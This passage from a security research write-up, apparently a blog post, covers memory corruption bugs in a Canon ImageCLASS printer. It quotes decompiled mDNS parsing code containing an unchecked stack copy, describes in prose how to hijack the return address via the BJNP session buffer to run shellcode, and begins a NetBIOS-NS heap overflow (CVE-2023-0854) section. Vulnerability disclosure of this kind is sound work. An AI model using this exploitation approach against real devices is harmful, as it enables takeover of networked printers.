      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When it is parsing the NSEC(type 47) record, it does not check the length of the record. It will copy the data to a local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, which leads to a stack buffer overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct an mDNS packet to trigger the stack overflow. It does not have Stack Guard, so we can overwrite the return address directly. It also does not implement DEP. We can overwrite the return address with a global buffer which we can control to run our shellcode.&lt;/p&gt;

&lt;p&gt;We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can run shellcode to do anything, such as modifying the website, changing the LCD screen, etc.&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;
&lt;p&gt;Ôº∑e found a heap overflow on NetBIOS. NetBIOS is a protocol for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. . Canon implemented the NetBIOS daemon by themselves.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;NetBIOS provides three distinct services:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) for name registration and resolution.&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) for connectionless communication.&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) for connection-oriented communication.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will focus on NetBIOS-NS (port 137).&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about NetBIOS-NS Packet Structure.&lt;/p&gt;

&lt;p&gt;NetBIOS-NS is based on the DNS packet format. It is defined in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; for both queries and responses. NetBIOS queries and responses utilize the NS header format defined in RFC1002 with exceptions noted below:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The query will be placed after the header. The first element is QNAME which is a domain name represented as a sequence of labels, where each label consists of a length character followed by that number of characters. Other element is not important in this vulnerability, so we won‚Äôt explain more here. More details can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the NetBIOS in NetBIOS packets, there is a heap overflow. The vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function. We can trigger it from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When NetBIOS service starts, it will initial &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt;. The buffer would be allocated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xff&lt;/code&gt; bytes from the heap.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When parsing the NetBIOS-NS in NetBIOS packets, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt; to process it.&lt;/p&gt;

